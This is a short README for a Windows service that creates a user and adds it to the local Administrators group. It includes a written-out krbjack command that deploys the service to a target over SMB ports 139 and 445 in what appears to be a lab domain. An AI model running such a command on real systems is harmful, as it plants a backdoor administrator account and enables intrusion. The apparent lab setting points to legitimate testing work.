# svcadduserAdmin
Simple service that creates a new user and adds it in localgroup Administrators


I used it with https://github.com/almandin/krbjack

usage:

![image](https://github.com/foxlox/svcadduserAdmin/assets/28823598/ba3fb701-4446-4a6d-9dae-d3ab5cc3f7f7)


edit the source file in the picture at line 57 and replace:
str(uuid etc) with 'service1'


then run
python3 -m krbjack --target-name winattacker --domain bluelab.local --dc-ip 172.27.18.19 --ports 139,445 --executable /opt/service1.exe

kaliattacker: victim


enjoy

